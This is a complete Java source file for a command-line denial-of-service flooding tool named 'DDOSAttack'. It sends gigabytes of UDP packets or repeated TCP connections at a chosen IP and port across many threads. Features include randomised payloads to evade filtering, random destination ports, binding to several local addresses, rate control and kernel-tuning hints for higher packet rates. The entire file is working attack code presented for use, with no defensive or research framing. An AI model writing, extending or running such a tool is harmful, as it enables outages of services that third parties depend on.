import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.DatagramChannel;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.LongAdder;

public class DDOSAttack {

    // ---------- Shared statistics ----------
    private static final LongAdder totalSent = new LongAdder();
    private static final LongAdder totalBytes = new LongAdder();
    private static final LongAdder totalDropped = new LongAdder();
    private static volatile boolean stopFlag = false;

    // ---------- Error counters ----------
    private static final LongAdder errBind = new LongAdder();
    private static final LongAdder errPortUnreachable = new LongAdder();
    private static final LongAdder errIOException = new LongAdder();
    private static final LongAdder errOther = new LongAdder();

    // ---------- Error log rate limiter ----------
    private static final int ERR_LOG_PER_SEC = 5;
    private static final int ERR_HISTORY_MAX = 10;
    private static final Deque<String> recentErrors = new ConcurrentLinkedDeque<>();
    private static final ErrorRateLimiter errorLimiter = new ErrorRateLimiter(ERR_LOG_PER_SEC);

    // ---------- Config ----------
    private static String targetIP;
    private static int targetPort;
    private static long totalPackets;
    private static int packetSize = 1490;
    private static int numThreads = 4;
    private static int burstSize = 50;
    private static double rateLimit = 0.0;  // seconds per burst
    private static int duration = 0;
    private static int srcPortBase = -1;
    private static boolean randomTargetPort = false;
    private static boolean bindLocal = false;
    private static boolean varyPayload = true;
    private static boolean useTcp = false;
    private static String logFile = null;
    private static int maxRetries = 3;

    private static PrintWriter logWriter = null;
    private static InetSocketAddress[] portAddresses;
    private static List<InetAddress> localAddresses = new ArrayList<>();

    // ===================================================================
    // Inner helpers
    // ===================================================================

    /** Token bucket for precise long-term rate control with short bursts. */
    static class TokenBucket {
        private final double capacity;
        private final double refillPerSec;
        private double tokens;
        private long lastRefillNs;

        TokenBucket(double capacity, double refillPerSec) {
            this.capacity = capacity;
            this.refillPerSec = refillPerSec;
            this.tokens = capacity;
            this.lastRefillNs = System.nanoTime();
        }

        private void refill() {
            long now = System.nanoTime();
            double elapsed = (now - lastRefillNs) / 1e9;
            if (elapsed > 0) {
                tokens = Math.min(capacity, tokens + elapsed * refillPerSec);
                lastRefillNs = now;
            }
        }

        /** Returns 0 if enough tokens; otherwise nanoseconds to wait. */
        synchronized long nanosToWait(int need) {
            refill();
            if (tokens >= need) {
                tokens -= need;
                return 0;
            }
            double missing = need - tokens;
            return (long) ((missing / refillPerSec) * 1e9);
        }
    }

    /** Token-bucket backed error rate limiter to avoid log flood. */
    static class ErrorRateLimiter {
        private final int maxPerSec;
        private long windowStart;
        private int count;
        private long suppressed;

        ErrorRateLimiter(int maxPerSec) {
            this.maxPerSec = maxPerSec;
            this.windowStart = System.currentTimeMillis();
        }

        synchronized boolean allow() {
            long now = System.currentTimeMillis();
            if (now - windowStart > 1000) {
                windowStart = now;
                count = 0;
            }
            if (count < maxPerSec) {
                count++;
                return true;
            }
            suppressed++;
            return false;
        }

        synchronized long suppressed() { return suppressed; }
    }

    // ===================================================================
    // Main
    // ===================================================================
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            printUsage();
            System.exit(0);
        }
        parseArgs(args);

        if (logFile != null) {
            try {
                logWriter = new PrintWriter(new FileWriter(logFile, true));
            } catch (IOException e) {
                System.err.println("[!] Cannot open log file: " + e.getMessage());
            }
        }

        try {
            InetAddress.getByName(targetIP);
        } catch (UnknownHostException e) {
            System.err.println("[!] Invalid target IP: " + targetIP);
            System.exit(1);
        }
        if (targetPort < 1 || targetPort > 65535) {
            System.err.println("[!] Port out of range: " + targetPort);
            System.exit(1);
        }
        if (packetSize < 64) packetSize = 64;
        if (packetSize > 65000) packetSize = 65000;
        if (totalPackets <= 0) {
            System.err.println("[!] Total packets must be > 0");
            System.exit(1);
        }

        if (randomTargetPort && !useTcp) {
            portAddresses = new InetSocketAddress[65536];
            for (int i = 1; i <= 65535; i++) {
                portAddresses[i] = new InetSocketAddress(targetIP, i);
            }
        }

        if (bindLocal) {
            enumerateLocalAddresses();
            if (localAddresses.isEmpty()) {
                System.err.println("[!] No usable local addresses found, disabling --bind-local.");
                bindLocal = false;
            } else {
                System.out.printf("[+] --bind-local enabled, %d local addresses available.%n",
                        localAddresses.size());
            }
        }

        printKernelTuningHints();

        System.out.printf("[+] target=%s:%d  proto=%s  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%s%n",
                targetIP, targetPort, useTcp ? "TCP" : "UDP",
                (double) totalPackets * packetSize / (1024.0 * 1024 * 1024),
                totalPackets, numThreads, packetSize,
                randomTargetPort ? "  random-port" : "",
                varyPayload ? "  vary" : "");
        if (bindLocal) {
            System.out.println("[+] per-thread local source IP bind (Java cannot spoof source IP)");
        }
        if (rateLimit > 0) {
            System.out.printf("[+] token-bucket rate: target ≈ %.0f pps%n",
                    burstSize / rateLimit);
        }
        System.out.println("[+] attacking... (Ctrl+C to stop)");

        Runtime.getRuntime().addShutdownHook(new Thread(() -> stopFlag = true));

        long startTime = System.currentTimeMillis();
        if (useTcp) {
            startTcpAttack();
        } else {
            startUdpAttack();
        }
        long elapsed = System.currentTimeMillis() - startTime;

        long finalSent = totalSent.longValue();
        long finalBytes = totalBytes.longValue();
        long finalDropped = totalDropped.longValue();
        double rate = elapsed > 0 ? finalSent / (elapsed / 1000.0) : 0;

        System.out.printf("%n[=] done: %d pkts sent, %d dropped, %.4f GB, %.2fs, %.1f pps%n",
                finalSent, finalDropped, finalBytes / (1024.0 * 1024 * 1024),
                elapsed / 1000.0, rate);
        System.out.printf("[=] errors: bind=%d  port-unreach=%d  io=%d  other=%d  (suppressed=%d)%n",
                errBind.longValue(), errPortUnreachable.longValue(),
                errIOException.longValue(), errOther.longValue(),
                errorLimiter.suppressed());
        if (!recentErrors.isEmpty()) {
            System.out.println("[=] recent errors:");
            for (String e : recentErrors) {
                System.out.println("    " + e);
            }
        }

        if (logWriter != null) {
            logWriter.printf("done: sent=%d dropped=%d bytes=%d time=%.2fs rate=%.1fpps%n",
                    finalSent, finalDropped, finalBytes, elapsed / 1000.0, rate);
            logWriter.close();
        }
    }

    // ===================================================================
    // Kernel tuning hints
    // ===================================================================
    private static void printKernelTuningHints() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("linux")) {
            System.out.println("[+] Linux kernel tuning tips (run on your machine, needs root):");
            System.out.println("    sysctl -w net.core.wmem_max=8388608 net.core.rmem_max=8388608");
            System.out.println("    sysctl -w net.ipv4.udp_mem='65536 131072 262144'");
            System.out.println("    ulimit -n 65535");
        }
    }

    // ===================================================================
    // Help
    // ===================================================================
    private static void printUsage() {
        System.out.println("[+] Usage: java DDOSAttack -t <IP> -p <PORT> -g <GB> [options]");
        System.out.println();
        System.out.println("[+] Required:");
        System.out.println("  -t, --target        Target IP");
        System.out.println("  -p, --port          Target port");
        System.out.println("  -g, --gb            Total traffic (GB)");
        System.out.println();
        System.out.println("[+] Optional:");
        System.out.println("  -P, --processes     Thread count (default 4)");
        System.out.println("  -b, --burst         Packets per burst (default 50)");
        System.out.println("  -r, --rate          Seconds per burst (default 0 = unlimited)");
        System.out.println("                      Note: rate is now enforced by a token bucket,");
        System.out.println("                      so the long-term rate is precise (burstSize/rate pps).");
        System.out.println("  -d, --duration      Duration in seconds (default 0 = until finished)");
        System.out.println("  -s, --src-port      Source port base (default -1 = random)");
        System.out.println("  --size              Base packet size (default 1490)");
        System.out.println("  --random-port       Randomize target port (UDP only)");
        System.out.println("  --bind-local        Bind each thread to a different local interface IP");
        System.out.println("                      (Java has no raw socket; true source-IP spoofing is impossible)");
        System.out.println("  --tcp               Use full TCP connect (not SYN flood; Java limitation)");
        System.out.println("  --vary / --no-vary  Enable/disable payload variation (default: enabled)");
        System.out.println("  --log <file>        Log file path");
        System.out.println("  --max-retries       Max send retries per packet (default 3)");
        System.out.println("  -h, --help          Show this help");
        System.out.println();
        System.out.println("[+] Notes:");
        System.out.println("  * True source-IP spoofing requires raw sockets (C/Python+root), not available in Java.");
        System.out.println("  * TCP mode uses full handshake; it's connect-flood, not SYN-flood.");
        System.out.println("  * High PPS requires kernel tuning — see hints printed at startup.");
    }

    // ===================================================================
    // Argument parsing
    // ===================================================================
    private static void parseArgs(String[] args) {
        Map<String, String> params = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            if (args[i].startsWith("-")) {
                if (i + 1 < args.length && !args[i + 1].startsWith("-")) {
                    params.put(args[i], args[i + 1]);
                    i++;
                } else {
                    params.put(args[i], "true");
                }
            }
        }

        if (params.containsKey("-h") || params.containsKey("--help")) {
            printUsage();
            System.exit(0);
        }

        targetIP = params.getOrDefault("-t", params.get("--target"));
        if (targetIP == null) { System.err.println("[!] Missing -t/--target"); System.exit(1); }

        String portStr = params.getOrDefault("-p", params.get("--port"));
        if (portStr == null) { System.err.println("[!] Missing -p/--port"); System.exit(1); }
        targetPort = Integer.parseInt(portStr);

        String gbStr = params.getOrDefault("-g", params.get("--gb"));
        if (gbStr == null) { System.err.println("[!] Missing -g/--gb"); System.exit(1); }
        double gb = Double.parseDouble(gbStr);

        if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
        if (params.containsKey("-T")) numThreads = Integer.parseInt(params.get("-T"));
        if (params.containsKey("-b")) burstSize = Integer.parseInt(params.get("-b"));
        if (params.containsKey("-r")) rateLimit = Double.parseDouble(params.get("-r"));
        if (params.containsKey("-d")) duration = Integer.parseInt(params.get("-d"));
        if (params.containsKey("-s")) srcPortBase = Integer.parseInt(params.get("-s"));
        if (params.containsKey("--size")) packetSize = Integer.parseInt(params.get("--size"));
        if (params.containsKey("--random-port")) randomTargetPort = true;
        if (params.containsKey("--bind-local")) bindLocal = true;
        if (params.containsKey("--tcp")) useTcp = true;
        if (params.containsKey("--no-vary")) varyPayload = false;
        if (params.containsKey("--vary")) varyPayload = true;
        if (params.containsKey("--log")) logFile = params.get("--log");
        if (params.containsKey("--max-retries")) maxRetries = Integer.parseInt(params.get("--max-retries"));

        if (gb <= 0) { System.err.println("[!] GB must be > 0"); System.exit(1); }
        totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
        if (totalPackets <= 0) { System.err.println("[!] Traffic too small"); System.exit(1); }
    }

    // ===================================================================
    // Local address enumeration
    // ===================================================================
    private static void enumerateLocalAddresses() {
        try {
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            if (ifaces == null) return;
            for (NetworkInterface iface : Collections.list(ifaces)) {
                if (!iface.isUp() || iface.isLoopback()) continue;
                for (InterfaceAddress ia : iface.getInterfaceAddresses()) {
                    InetAddress addr = ia.getAddress();
                    if (addr instanceof Inet4Address) {
                        localAddresses.add(addr);
                    }
                }
            }
        } catch (SocketException e) {
            System.err.println("[!] Failed to enumerate interfaces: " + e.getMessage());
        }
    }

    // ===================================================================
    // Error recording (rate-limited)
    // ===================================================================
    private static void recordError(String msg) {
        if (!errorLimiter.allow()) return;
        recentErrors.addLast(msg);
        while (recentErrors.size() > ERR_HISTORY_MAX) {
            recentErrors.pollFirst();
        }
    }

    // ===================================================================
    // Payload pool (DirectByteBuffer)
    // ===================================================================
    /**
     * Builds a pool of pre-filled DirectByteBuffers.
     * Variation:
     *   - each buffer has random length ±10% around base size
     *   - each buffer has random content
     *   - the last 8 bytes are overwritten per-packet with a counter
     *   - 16 random bytes near the beginning are XOR-flipped per packet
     */
    private static List<ByteBuffer> buildDirectPayloadPool(int baseSize, int poolSize) {
        Random rnd = new Random();
        int delta = varyPayload ? Math.max(1, baseSize / 10) : 0;
        List<ByteBuffer> pool = new ArrayList<>(poolSize);
        for (int i = 0; i < poolSize; i++) {
            int len = baseSize - delta + (delta > 0 ? rnd.nextInt(delta * 2 + 1) : 0);
            if (len < 64) len = 64;
            if (len > 65000) len = 65000;

            ByteBuffer buf = ByteBuffer.allocateDirect(len);
            byte[] tmp = new byte[len];
            rnd.nextBytes(tmp);
            buf.put(tmp);
            buf.flip();
            pool.add(buf);
        }
        return pool;
    }

    // ===================================================================
    // UDP attack (main path)
    // ===================================================================
    private static void startUdpAttack() throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long packetsPerThread = totalPackets / numThreads;
        long extra = totalPackets % numThreads;

        final int poolSize = 512;

        for (int i = 0; i < numThreads; i++) {
            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
            int threadId = i;
            Runnable task = () -> {
                String tag = "T" + threadId;
                ThreadLocalRandom rnd = ThreadLocalRandom.current();
                List<ByteBuffer> pool = buildDirectPayloadPool(packetSize, poolSize);

                DatagramChannel channel = null;
                TokenBucket bucket = null;
                if (rateLimit > 0) {
                    // Allow short bursts of up to 2x burstSize
                    bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
                }

                int consecutiveFailures = 0;

                try {
                    channel = openUdpChannelForThread(threadId);
                    InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);

                    long sent = 0, bytesSent = 0, dropped = 0;
                    long packetCounter = 0;

                    while (!stopFlag && sent < pktCount) {
                        int toSend = (int) Math.min(burstSize, pktCount - sent);

                        // --- Token bucket gate ---
                        if (bucket != null) {
                            long waitNs = bucket.nanosToWait(toSend);
                            if (waitNs > 0) {
                                TimeUnit.NANOSECONDS.sleep(waitNs);
                            }
                        }

                        for (int j = 0; j < toSend; j++) {
                            if (stopFlag || sent >= pktCount) break;

                            ByteBuffer buf = pool.get((int) (packetCounter % pool.size()));
                            int limit = buf.limit();
                            if (limit < 8) continue;

                            // Overwrite last 8 bytes with counter
                            long c = packetCounter;
                            for (int b = 0; b < 8; b++) {
                                buf.put(limit - 1 - b, (byte) (c & 0xFF));
                                c >>>= 8;
                            }
                            // XOR-flip 16 bytes near the beginning (index 4..19) for variation
                            if (varyPayload && limit >= 24) {
                                int base = 4;
                                for (int b = 0; b < 16; b++) {
                                    int idx = base + b;
                                    byte v = buf.get(idx);
                                    buf.put(idx, (byte) (v ^ (byte) rnd.nextInt(256)));
                                }
                            }
                            packetCounter++;

                            InetSocketAddress targetAddr;
                            if (randomTargetPort) {
                                int port = rnd.nextInt(1, 65536);
                                targetAddr = portAddresses[port];
                            } else {
                                targetAddr = dest;
                            }

                            boolean ok = sendUdpWithRetry(channel, buf, targetAddr, tag);
                            if (ok) {
                                sent++;
                                bytesSent += limit;
                                consecutiveFailures = 0;
                            } else {
                                dropped++;
                                consecutiveFailures++;
                                // Exponential backoff on repeated failures
                                if (consecutiveFailures >= 3) {
                                    long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
                                    Thread.sleep(backoffMs);
                                    if (channel == null || !channel.isOpen()) {
                                        try { channel = openUdpChannelForThread(threadId); } catch (Exception ignore) {}
                                    }
                                }
                            }
                        }

                        if (sent > 0) {
                            totalSent.add(sent);
                            totalBytes.add(bytesSent);
                            totalDropped.add(dropped);
                            sent = 0;
                            bytesSent = 0;
                            dropped = 0;
                        }
                    }

                } catch (Exception e) {
                    errOther.increment();
                    recordError(tag + " fatal: " + e.getClass().getSimpleName()
                            + " (" + e.getMessage() + ")");
                } finally {
                    if (channel != null) {
                        try { channel.close(); } catch (IOException ignored) { }
                    }
                }
            };
            futures.add(executor.submit(task));
        }

        waitWithProgress(executor, futures);
    }

    // ===================================================================
    // TCP attack (connect flood; not SYN flood)
    // ===================================================================
    private static void startTcpAttack() throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long packetsPerThread = totalPackets / numThreads;
        long extra = totalPackets % numThreads;

        final int connectTimeoutMs = 1000;
        final int socketTimeoutMs = 500;

        for (int i = 0; i < numThreads; i++) {
            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
            int threadId = i;
            Runnable task = () -> {
                String tag = "T" + threadId;
                InetAddress bindAddr = null;
                if (bindLocal && !localAddresses.isEmpty()) {
                    bindAddr = localAddresses.get(threadId % localAddresses.size());
                }

                long sent = 0, bytesSent = 0, dropped = 0;
                int consecutiveFailures = 0;
                byte[] payload = new byte[Math.min(64, packetSize)];
                new Random().nextBytes(payload);

                TokenBucket bucket = null;
                if (rateLimit > 0) {
                    bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
                }

                while (!stopFlag && sent < pktCount) {
                    int toSend = (int) Math.min(burstSize, pktCount - sent);

                    if (bucket != null) {
                        long waitNs = bucket.nanosToWait(toSend);
                        if (waitNs > 0) {
                            try { TimeUnit.NANOSECONDS.sleep(waitNs); } catch (InterruptedException ignored) {}
                        }
                    }

                    for (int j = 0; j < toSend; j++) {
                        if (stopFlag || sent >= pktCount) break;

                        try (Socket s = new Socket()) {
                            if (bindAddr != null) s.bind(new InetSocketAddress(bindAddr, 0));
                            s.setSoTimeout(socketTimeoutMs);
                            s.connect(new InetSocketAddress(targetIP, targetPort), connectTimeoutMs);
                            OutputStream os = s.getOutputStream();
                            os.write(payload);
                            os.flush();
                            sent++;
                            bytesSent += payload.length;
                            consecutiveFailures = 0;
                        } catch (PortUnreachableException e) {
                            errPortUnreachable.increment();
                            dropped++;
                            consecutiveFailures++;
                        } catch (IOException e) {
                            errIOException.increment();
                            dropped++;
                            consecutiveFailures++;
                        }

                        if (consecutiveFailures >= 3) {
                            long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
                            try { Thread.sleep(backoffMs); } catch (InterruptedException ignored) {}
                            if (consecutiveFailures > 6) {
                                recordError(tag + ": too many consecutive failures, backoff " + backoffMs + "ms");
                            }
                        }
                    }

                    if (sent > 0 || dropped > 0) {
                        totalSent.add(sent);
                        totalBytes.add(bytesSent);
                        totalDropped.add(dropped);
                        sent = 0;
                        bytesSent = 0;
                        dropped = 0;
                    }
                }
            };
            futures.add(executor.submit(task));
        }

        waitWithProgress(executor, futures);
    }

    // ===================================================================
    // Progress monitor + graceful shutdown
    // ===================================================================
    private static void waitWithProgress(ExecutorService executor, List<Future<?>> futures) throws Exception {
        long start = System.currentTimeMillis();
        long lastReportTime = start;
        long lastReportSent = 0;

        while (!stopFlag) {
            long now = System.currentTimeMillis();
            long elapsed = now - start;
            long sent = totalSent.longValue();
            long bytes = totalBytes.longValue();
            long dropped = totalDropped.longValue();

            if (sent >= totalPackets) break;
            if (duration > 0 && elapsed / 1000 >= duration) {
                stopFlag = true;
                break;
            }

            if (now - lastReportTime >= 1000) {
                long deltaSent = sent - lastReportSent;
                double deltaTime = (now - lastReportTime) / 1000.0;
                double instantRate = deltaSent / deltaTime;
                double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
                double dataGB = bytes / (1024.0 * 1024 * 1024);
                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d  err_suppressed=%d%n",
                        sent, dataGB, rate, instantRate, dropped, errorLimiter.suppressed());
                if (logWriter != null) {
                    logWriter.printf("sent=%d data=%.4fGB rate=%.0fpps drop=%d%n",
                            sent, dataGB, rate, dropped);
                    logWriter.flush();
                }
                lastReportTime = now;
                lastReportSent = sent;
            }

            Thread.sleep(100);
        }

        stopFlag = true;
        for (Future<?> f : futures) {
            try { f.get(); } catch (Exception ignored) { }
        }

        executor.shutdown();
        try {
            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }
    }

    // ===================================================================
    // UDP send with retry
    // ===================================================================
    private static boolean sendUdpWithRetry(DatagramChannel channel, ByteBuffer buf,
                                            SocketAddress target, String tag) {
        int attempts = 0;
        while (attempts < maxRetries) {
            try {
                buf.clear();
                int written = channel.send(buf, target);
                if (written > 0) return true;
            } catch (PortUnreachableException e) {
                errPortUnreachable.increment();
                recordError(tag + ": port unreachable (" + target + ")");
            } catch (IOException e) {
                errIOException.increment();
                recordError(tag + ": IOException (" + e.getMessage() + ")");
            } catch (Exception e) {
                errOther.increment();
                recordError(tag + ": " + e.getClass().getSimpleName() + " (" + e.getMessage() + ")");
            }
            attempts++;
        }
        return false;
    }

    // ===================================================================
    // UDP channel factory (larger SO_SNDBUF; per-thread local IP bind)
    // ===================================================================
    private static DatagramChannel openUdpChannelForThread(int threadId) throws IOException {
        DatagramChannel channel = DatagramChannel.open();
        channel.configureBlocking(true);

        DatagramSocket socket = channel.socket();
        try {
            socket.setReuseAddress(true);
            // Try to enlarge send buffer to 4MB; ignore if unsupported
            try {
                socket.setSendBufferSize(4 * 1024 * 1024);
            } catch (SocketException ignored) { }
        } catch (SocketException ignored) { }

        InetAddress bindAddr = null;
        int bindPort = 0;

        if (bindLocal && !localAddresses.isEmpty()) {
            bindAddr = localAddresses.get(threadId % localAddresses.size());
        }
        if (srcPortBase >= 0) {
            bindPort = srcPortBase + threadId;
        }

        if (bindAddr != null || bindPort > 0) {
            try {
                socket.bind(new InetSocketAddress(
                        bindAddr != null ? bindAddr : InetAddress.getByName("0.0.0.0"),
                        bindPort));
            } catch (BindException e) {
                errBind.increment();
                recordError("T" + threadId + ": bind failed ("
                        + (bindAddr != null ? bindAddr : "0.0.0.0") + ":" + bindPort
                        + "), using system-assigned");
            }
        }

        return channel;
    }
}
